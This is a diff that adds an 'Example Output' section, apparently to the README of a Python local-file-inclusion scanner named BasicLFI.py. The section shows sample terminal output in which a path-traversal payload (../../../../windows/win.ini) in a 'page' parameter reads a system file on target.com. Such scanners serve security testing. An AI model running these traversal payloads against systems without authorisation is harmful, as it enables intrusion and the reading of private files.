@@ -1,0 +1,15 @@
+## Example Output
+
+```bash
+$ ./BasicLFI.py http target.com
+[+] Target: http://target.com
+[+] Scanning using common parameter names...
+Scanning:   0%|                                                                                          | 0/7 [00:00<?, ?it/s]
+[!] LFI Found!
+    Encoded : http://target.com/?page=../../../../../../../../windows/win.ini
+    Decoded : http://target.com/?page=../../../../../../../../windows/win.ini
+Scanning: 100%|█████████████████████████████████████████████████████████████████████████████████████| 7/7 [00:10<00:00,  1.45s/it]
+
+[+] LFI vulnerabilities discovered! Results saved to lfi_scan_results.json
+
+
